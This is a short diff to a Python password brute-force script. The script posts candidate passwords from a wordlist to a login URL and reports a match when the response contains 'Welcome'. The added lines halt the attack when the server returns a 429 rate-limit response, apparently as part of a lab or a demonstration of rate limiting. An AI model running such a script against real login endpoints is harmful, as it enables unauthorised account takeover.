@@ -34,6 +34,10 @@ with open("passwords.txt", "r") as common_passwords:
 
         resp = requests.post(url, data=data)
 
+        if resp.status_code == 429:
+            print("\n[!] Rate limit hit. Brute force attack stopped.")
+            break
+
         if "Welcome" in resp.text:
             duration = time.time() - start_time
             print(f"\n[+] Password FOUND: {password}")
